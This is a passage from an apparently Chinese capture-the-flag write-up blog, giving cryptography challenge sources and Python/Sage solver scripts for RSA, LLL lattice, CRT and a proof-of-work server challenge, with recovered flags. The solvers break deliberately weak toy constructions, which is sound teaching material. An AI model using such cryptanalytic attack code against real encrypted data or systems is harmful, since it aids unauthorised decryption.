(p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br>d = inverse(e, phi)<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br>ans = long_to_bytes(m)<br><span class="hljs-built_in">print</span>(ans)<br></code></pre></td></tr></table></figure><h1 id="LLL"><a href="#LLL" class="headerlink" title="LLL"></a>LLL</h1><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-string">b&#x27;******&#x27;</span><br>m = bytes_to_long(flag)<br><br><span class="hljs-keyword">assert</span> m.bit_length() == <span class="hljs-number">327</span><br>p = getPrime(<span class="hljs-number">1024</span>)<br>a = getPrime(<span class="hljs-number">1024</span>)<br>c = getPrime(<span class="hljs-number">400</span>)<br><br>b = (a*m + c) % p<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;a = <span class="hljs-subst">&#123;a&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;b = <span class="hljs-subst">&#123;b&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;p = <span class="hljs-subst">&#123;p&#125;</span>&#x27;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">a = 169790849804323540946197204708402762862586197604183102589270741859708550301920348112941305999764092197996929298474590062625556806793613268527763774013772685954699561684244945434843656515307801882995934869499880288594142919381501796488815033294127591623260894764750214588993456840404443515671353802614450411717</span><br><span class="hljs-string">b = 87985708831523238980948938165414984318379459926002798504435964538203443877988599888615810231215118828138306895572062833107988965151522391460216837691927960249874511818878134399363147008042562222910234739940697553852540265617603482995091203105040187460485673579382171260197291783748886765929376179151804062085</span><br><span class="hljs-string">p = 131724494512065658801039766546788821718063963144467818735768040631367069153816254855229655449559099188694403260044990366292026916085340250077198735215774149087025577263769846650728593180101073940507285459917860726551385227481715873503612683249433020201729190862430476054822102865441136763977415824331858801617</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>è§£ç­”ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> inverse, long_to_bytes<br>a = <span class="hljs-number">169790849804323540946197204708402762862586197604183102589270741859708550301920348112941305999764092197996929298474590062625556806793613268527763774013772685954699561684244945434843656515307801882995934869499880288594142919381501796488815033294127591623260894764750214588993456840404443515671353802614450411717</span><br>b = <span class="hljs-number">87985708831523238980948938165414984318379459926002798504435964538203443877988599888615810231215118828138306895572062833107988965151522391460216837691927960249874511818878134399363147008042562222910234739940697553852540265617603482995091203105040187460485673579382171260197291783748886765929376179151804062085</span><br>p = <span class="hljs-number">131724494512065658801039766546788821718063963144467818735768040631367069153816254855229655449559099188694403260044990366292026916085340250077198735215774149087025577263769846650728593180101073940507285459917860726551385227481715873503612683249433020201729190862430476054822102865441136763977415824331858801617</span><br><br>m = matrix(ZZ ,[[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,a],[<span class="hljs-number">0</span>,<span class="hljs-number">2</span>^<span class="hljs-number">400</span>,b],[<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,p]])<br>L = m.LLL()[<span class="hljs-number">0</span>]<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">abs</span>(<span class="hljs-built_in">int</span>(L[<span class="hljs-number">0</span>]))))<br></code></pre></td></tr></table></figure><h1 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h1><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">import</span> socketserver<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> signal<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> random<br><br>flag = <span class="hljs-string">&quot;SYC&#123;...&#125;&quot;</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Task</span>(socketserver.BaseRequestHandler):<br><br>    ctry = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_recvall</span>(<span class="hljs-params">self</span>):<br>        BUFF_SIZE = <span class="hljs-number">2048</span><br>        data = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            part = <span class="hljs-variable language_">self</span>.request.recv(BUFF_SIZE)<br>            data += part<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(part) &lt; BUFF_SIZE:<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">return</span> data.strip()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">self, msg, newline=<span class="hljs-literal">True</span></span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> newline:<br>                msg += <span class="hljs-string">b&#x27;\n&#x27;</span><br>            <span class="hljs-variable language_">self</span>.request.sendall(msg)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">recv</span>(<span class="hljs-params">self, prompt=<span class="hljs-string">b&#x27;[-] &#x27;</span></span>):<br>        <span class="hljs-variable language_">self</span>.send(prompt, newline=<span class="hljs-literal">False</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>._recvall()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">proof_of_work</span>(<span class="hljs-params">self</span>):<br>        random.seed(os.urandom(<span class="hljs-number">8</span>))<br>        proof = <span class="hljs-string">&#x27;&#x27;</span>.join(<br>            [random.choice(string.ascii_letters+string.digits) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>)])<br>        _hexdigest = sha256(proof.encode()).hexdigest()<br>        <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">f&quot;[+] sha256(XXXX+<span class="hljs-subst">&#123;proof[<span class="hljs-number">4</span>:]&#125;</span>) == <span class="hljs-subst">&#123;_hexdigest&#125;</span>&quot;</span>.encode())<br>        x = <span class="hljs-variable language_">self</span>.recv(prompt=<span class="hljs-string">b&#x27;[+] Plz tell me XXXX: &#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(x) != <span class="hljs-number">4</span> <span class="hljs-keyword">or</span> sha256(x+proof[<span class="hljs-number">4</span>:].encode()).hexdigest() != _hexdigest:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">handle</span>(<span class="hljs-params">self</span>):<br>        signal.alarm(<span class="hljs-number">60</span>)<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-variable language_">self</span>.proof_of_work():<br>                <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&#x27;[!] Wrong!&#x27;</span>)<br>                <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&#x27;[*] Maybe you need a little force, right?&#x27;</span>)<br>                <span class="hljs-keyword">return</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&#x27;[*] HEY, MY NEW FRIENDDD, YOUUUUUU FIND THE RIGHT WAAAAAAY!&#x27;</span>)<br>                <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&#x27;[*] Or even more complex?&#x27;</span>)<br>                <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&#x27;[*] Maybe these details are not important. See below :D&#x27;</span>)<br><br>            signal.alarm(<span class="hljs-number">400</span>)<br>            <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&#x27;[+] &#x27;</span>)<br>            <span class="hljs-keyword">while</span> <span class="hljs-variable language_">self</span>.ctry &lt; <span class="hljs-number">35</span>:<br>                data = <span class="hljs-variable language_">self</span>.recv().decode()<br>                f = <span class="hljs-variable language_">self</span>.oraicle(data)<br>                <span class="hljs-variable language_">self</span>.send(f)<br>                <span class="hljs-variable language_">self</span>.ctry += <span class="hljs-number">1</span><br><br>        <span class="hljs-keyword">except</span> TimeoutError:<br>            <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&#x27;[!] Ohhehe, Timeout!&#x27;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">oraicle</span>(<span class="hljs-params">self,a</span>):<br><br>        <span class="hljs-keyword">if</span> a.isdigit() <span class="hljs-keyword">and</span> <span class="hljs-built_in">int</span>(a)&lt;<span class="hljs-number">33</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">int</span>(a)&gt;<span class="hljs-number">0</span>:<br>            a = <span class="hljs-built_in">int</span>(a)-<span class="hljs-number">1</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;[+] &#x27;</span> + flag[a].encode()<br><br>        <span class="hljs-keyword">return</span>  <span class="hljs-string">b&#x27;[!] Invalid Member!&#x27;</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadedServer</span>(socketserver.ThreadingMixIn, socketserver.TCPServer):<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ForkedServer</span>(socketserver.ForkingMixIn, socketserver.TCPServer):<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    HOST,PORT = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,<span class="hljs-number">12321</span><br>    server = ForkedServer((HOST,PORT),Task)<br>    server.allow_reuse_address = <span class="hljs-literal">True</span><br>    <span class="hljs-built_in">print</span>(HOST, PORT)<br>    server.serve_forever()<br></code></pre></td></tr></table></figure><p><strong>è§£ç­”ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">import</span> sys<br><br>table = <span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> table:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> table:<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> table:<br>            <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> table:<br>                string = i + j + k + l + <span class="hljs-string">&quot;wMysYhu7k3xtiRw8&quot;</span><br>                str_sha256 = sha256(string.encode()).hexdigest()<br>                <span class="hljs-keyword">if</span> str_sha256 == <span class="hljs-string">&quot;8529c5821de162e1c9d1a10f40d43706cb6c157544e029c1bc0a2833d1603198&quot;</span>:<br>                    <span class="hljs-built_in">print</span>(i+j+k+l)<br>                    sys.exit()<br><span class="hljs-comment">#SYC&#123;MAYB3_Y0U_KN0W_A1AN-B3&lt;K3R?&#125;</span><br></code></pre></td></tr></table></figure><h1 id="ncoCRT"><a href="#ncoCRT" class="headerlink" title="ncoCRT"></a>ncoCRT</h1><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br><br>flag = <span class="hljs-string">b&#x27;SYC&#123;...&#125;&#x27;</span><br>m = bytes_to_long(flag+<span class="hljs-string">b&#x27;\x01&#x27;</span>*<span class="hljs-number">23</span>)<br><br>p = [<span class="hljs-number">0</span>]*<span class="hljs-number">5</span><br>c = [<span class="hljs-number">0</span>]*<span class="hljs-number">5</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    p0 = random.randint(<span class="hljs-number">2</span>**<span class="hljs-number">100</span>,<span class="hljs-number">2</span>**<span class="hljs-number">101</span>)<br>    p[i] = p0<br>c = [m%p[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>)]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;p = <span class="hljs-subst">&#123;p&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;c = <span class="hljs-subst">&#123;c&#125;</span>&quot;</span>)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">p = [1921232050179818686537976490035, 2050175089402111328155892746480, 1960810970476421389691930930824, 1797713136323968089432024221276, 2326915607951286191807212748022]</span><br><span class="hljs-string">c = [1259284928311091851012441581576, 1501691203352712190922548476321, 1660842626322200346728249202857, 657314037433265072289232145909, 2056630082529583499248887436721]</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p><strong>è§£ç­”ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br>ms = [<span class="hljs-number">1921232050179818686537976490035</span>, <span class="hljs-number">2050175089402111328155892746480</span>, <span class="hljs-number">1960810970476421389691930930824</span>, <span class="hljs-number">1797713136323968089432024221276</span>, <span class="hljs-number">2326915607951286191807212748022</span>]<br>cs = [<span class="hljs-number">1259284928311091851012441581576</span>, <span class="hljs-number">1501691203352712190922548476321</span>, <span class="hljs-number">1660842626322200346728249202857</span>, <span class="hljs-number">657314037433265072289232145909</span>, <span class="hljs-number">2056630082529583499248887436721</span>]<br>x = crt(cs, ms)<br><span class="hljs-built_in">print</span>(long_to_bytes(x))<br></code></pre></td></tr></table></figure><h1 id="Number-theory"><a href="#Number-theory" class="headerlink" title="Number_theory"></a>Number_theory</h1><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><br>m = bytes_to_long(flag)<br>q = getPrime(<span class="hljs-number">1024</span>)<br>p = getPrime(<span class="hljs-number">1024</span>)<br>q1 = getPrime(<span class="hljs-number">1024</span>)<br>p1 = getPrime(<span class="hljs-number">1024</span>)<br>n = p * q<br>n1 = p1 * q<br>h0 = <span class="hljs-built_in">pow</span>(<span class="hljs-number">1012</span> * q + <span class="hljs-number">2024</span>, p1, n1)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;h0 = <span class="hljs-subst">&#123;h0&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;n1 = <span class="hljs-subst">&#123;n1&#125;</span>&quot;</span>)<br><br>n2 = p * q1<br>h1 = getPrime(<span class="hljs-number">128</span>)*p+getPrime(<span class="hljs-number">13</span>)*q1<br>h2 = getPrime(<span class="hljs-number">128</span>)*p+getPrime(<span class="hljs-number">13</span>)*q1<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;h1 = <span class="hljs-subst">&#123;h1&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;h2 = <span class="hljs-subst">&#123;h2&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;n2 = <span class="hljs-subst">&#123;n2&#125;</span>&#x27;</span>)<br><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c = <span class="hljs-subst">&#123;c&#125;</span>&#x27;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">h0 = 3220497006402049508998763812708472832647814868290156746347730942871191356255789659370553564805270033069126673720344310199953651087754072020225702916105541813428786992668144172000495857408180695235017329451164552864440669887978780387408892281885728829108705426036377534262123812335152528611168777211280571694805002313718755871797426493929314877273385162106226582910473718696585558235361302211164190022765345477880209355073870857330694309139033191510002831755011163554405501084092882774630793037506647051531578470767441695642108269033577519614546722167605348209455599860877630930453549375215766657975702946679735793440</span><br><span class="hljs-string">n1 = 20609629372145649869124883931477035418773265506807982287973634398860995335157854064383658546598627777214414513344620919765235474447787454254677033199140440513722365295528339478763686234572386246701669139829187532179573583918405628738545887852577214800663095592976049188005405242091639210252676232732956312108538849591909382864675439965387851084691144379692503823575367370407191667133473482821484955537306602611587604747693171586870973700406072872451067709522642066831289686968535823774273770385924779368338446367102184983154486987531633971065357864924738084803301054789863293592286600424063888458243900130876991944561</span><br><span class="hljs-string">h1 = 49194502383195208917988199785355579000471120627698824524136563939112767971337049691779758664899497703009458337602635607307068610164325874221815125058246159504553260658300727486252329656228567456351563661171511248498573151135374757953887871426130912974127123668357951196795364055703535399924661649957282476915345782505912688106575686848420343362888</span><br><span class="hljs-string">h2 = 56029812337811022982598747354987989915364610368395101948222609237230875599013444593473706280586983516630982411154519894488542135837471701015074142753084529513202513061481615522865380857058628008542724882609524855349464549317203533208567803034618377155637303135785566874122555481931560957334493233423618193735362609235034574175221191665401074291634</span><br><span class="hljs-string">n2 = 21127172569887870569621986802814771398069606826661397979515556618791602174698226712111670185315617811180192688381471253591193212149192104216153890060029438171543010427356810059660168369171504065120474047401466632600230981702536898738744701541132759858595341068713321976579864810553447534204513491008705215041861247277449063318972113826820821732327255577559447446606667162763843696891825420560307688553022453470653875157114663943723258181186659915926780802902213978395961981750159147594076399769386787561910947372748908551775527715538708855235861297549189165238857651886658156332640360898769204102407630920314871304057</span><br><span class="hljs-string">c = 5607552428806279725164332098717496105359323731793797865776852054987286366396268835656116948807084338497364746716217052175055013330847114498067023163878490040957130515880922531725226729467904687450269817551037876044274898360914422201634758724176912018795267171627398316542607462818553194467631468793807762529509728325759331142060865432879561622747895422022839077034959965640817419843376693946391886148327389538923557583964708218796910422008150480950732394548385083016293891237783400286493750498647816940000092965104858068292374074379723230507283787259827582725133425982004517180631242028412315096023451549819804660838</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>åˆ†æï¼š</strong><br>(1)<br>$h0\equiv (1012\cdot q+2024)^{p1} \mod n1$<br>$h0 \equiv 2024^{p1} \mod q$<br>ä¸¤è¾¹åŒæ—¶å–$q$æ¬¡æ–¹ï¼š$h0^q \equiv 2024^{n1} \mod q$<br>$h0\equiv 2024^{n1}\mod q$<br>$h0 - 2024^{n1} &#x3D; k\cdot q$<br>$q &#x3D; gcd(h0-2024^{n1},n1)$<br>(2)<br>$h1 &#x3D; k1\cdot p+a\cdot q1$<br>$h2 &#x3D; k2\cdot p+ b\cdot q1$<br>ç”±äº$a,b$æ˜¯å°ä½æ•°ï¼Œå¯çˆ†ç ´å‡ºæ¥ï¼Œå› æ­¤å½“ä½œå·²çŸ¥é‡<br>$b\cdot h1 &#x3D; b\cdot k1\cdot p+a\cdot b\cdot q1$<br>$a\cdot h2 &#x3D; a\cdot k2\cdot p+a\cdot b\cdot q1$<br>$b\cdot h1 - a\cdot h2 &#x3D; b\cdot k1\cdot p-a\cdot k2\cdot p&#x3D;(b\cdot k1-a\cdot k2)\cdot p$<br>åˆ™$p&#x3D;gcd(b\cdot h1-a\cdot h2,n2)$</p><p><strong>è§£ç­”ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> isPrime,inverse,long_to_bytes<br>h0 = <span class="hljs-number">3220497006402049508998763812708472832647814868290156746347730942871191356255789659370553564805270033069126673720344310199953651087754072020225702916105541813428786992668144172000495857408180695235017329451164552864440669887978780387408892281885728829108705426036377534262123812335152528611168777211280571694805002313718755871797426493929314877273385162106226582910473718696585558235361302211164190022765345477880209355073870857330694309139033191510002831755011163554405501084092882774630793037506647051531578470767441695642108269033577519614546722167605348209455599860877630930453549375215766657975702946679735793440</span><br>n1 = <span class="hljs-number">20609629372145649869124883931477035418773265506807982287973634398860995335157854064383658546598627777214414513344620919765235474447787454254677033199140440513722365295528339478763686234572386246701669139829187532179573583918405628738545887852577214800663095592976049188005405242091639210252676232732956312108538849591909382864675439965387851084691144379692503823575367370407191667133473482821484955537306602611587604747693171586870973700406072872451067709522642066831289686968535823774273770385924779368338446367102184983154486987531633971065357864924738084803301054789863293592286600424063888458243900130876991944561</span><br>h1 = <span class="hljs-number">49194502383195208917988199785355579000471120627698824524136563939112767971337049691779758664899497703009458337602635607307068610164325874221815125058246159504553260658300727486252329656228567456351563661171511248498573151135374757953887871426130912974127123668357951196795364055703535399924661649957282476915345782505912688106575686848420343362888</span><br>h2 = <span class="hljs-number">56029812337811022982598747354987989915364610368395101948222609237230875599013444593473706280586983516630982411154519894488542135837471701015074142753084529513202513061481615522865380857058628008542724882609524855349464549317203533208567803034618377155637303135785566874122555481931560957334493233423618193735362609235034574175221191665401074291634</span><br>n2 = <span class="hljs-number">21127172569887870569621986802814771398069606826661397979515556618791602174698226712111670185315617811180192688381471253591193212149192104216153890060029438171543010427356810059660168369171504065120474047401466632600230981702536898738744701541132759858595341068713321976579864810553447534204513491008705215041861247277449063318972113826820821732327255577559447446606667162763843696891825420560307688553022453470653875157114663943723258181186659915926780802902213978395961981750159147594076399769386787561910947372748908551775527715538708855235861297549189165238857651886658156332640360898769204102407630920314871304057</span><br>c = <span class="hljs-number">5607552428806279725164332098717496105359323731793797865776852054987286366396268835656116948807084338497364746716217052175055013330847114498067023163878490040957130515880922531725226729467904687450269817551037876044274898360914422201634758724176912018795267171627398316542607462818553194467631468793807762529509728325759331142060865432879561622747895422022839077034959965640817419843376693946391886148327389538923557583964708218796910422008150480950732394548385083016293891237783400286493750498647816940000092965104858068292374074379723230507283787259827582725133425982004517180631242028412315096023451549819804660838</span><br>e = <span class="hljs-number">65537</span><br>q = gmpy2.gcd(h0-<span class="hljs-built_in">pow</span>(<span class="hljs-number">2024</span>,n1,n1),n1)<br><span class="hljs-built_in">print</span>(q)<br><span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**<span class="hljs-number">12</span>,<span class="hljs-number">2</span>**<span class="hljs-number">13</span>-<span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> isPrime(a):<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**<span class="hljs-number">12</span>,<span class="hljs-number">2</span>**<span class="hljs-number">13</span>-<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> isPrime(b):<br>            <span class="hljs-keyword">continue</span><br>        p=gmpy2.gcd(b*h1-a*h2,n2)<br>        <span class="hljs-keyword">if</span> p!= <span class="hljs-number">1</span>:<br>            <span class="hljs-built_in">print</span>(p)<br>            n = p*q<br>            phi = (p-<span class="hljs-number">1</span>) * (q-<span class="hljs-number">1</span>)<br>            d = inverse(e,phi)<br>            m = <span class="hljs-built_in">pow</span>(c,d,n)<br>            ans = long_to_bytes(m)<br>            <span class="hljs-built_in">print</span>(ans)<br>            exit()<br><br></code></pre></td></tr></table></figure><h1 id="RnoCRT"><a href="#RnoCRT" class="headerlink" title="RnoCRT"></a>RnoCRT</h1><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> x<br><br>m = [getRandomNBitInteger(<span class="hljs-number">256</span>) <span 